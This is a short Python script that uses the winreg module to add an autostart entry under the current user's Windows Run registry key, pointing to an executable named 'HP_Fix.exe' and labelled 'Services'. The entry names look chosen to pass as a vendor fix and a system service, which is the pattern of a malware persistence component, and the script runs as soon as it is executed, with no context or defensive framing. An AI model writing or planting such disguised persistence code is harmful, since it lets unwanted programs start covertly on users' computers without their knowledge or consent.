import winreg
import os

def start_regitry_edit():
    try:
        name1 = "HP_Fix.exe"
        pwd = str(os.getcwd())
        path = "Software\Microsoft\Windows\CurrentVersion\Run"
        name = "Services"
        value = pwd + "\\" + name1
        winreg.CreateKey(winreg.HKEY_CURRENT_USER,path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,path,0,winreg.KEY_WRITE)
        winreg.SetValueEx(key,name,0,winreg.REG_SZ, value)
        winreg.CloseKey(key)
        print("Values Written")
    except PermissionError:
        print("Access Denied!")
    except Exception as ee:
        print("Error : %s"%(str(ee)))

start_regitry_edit()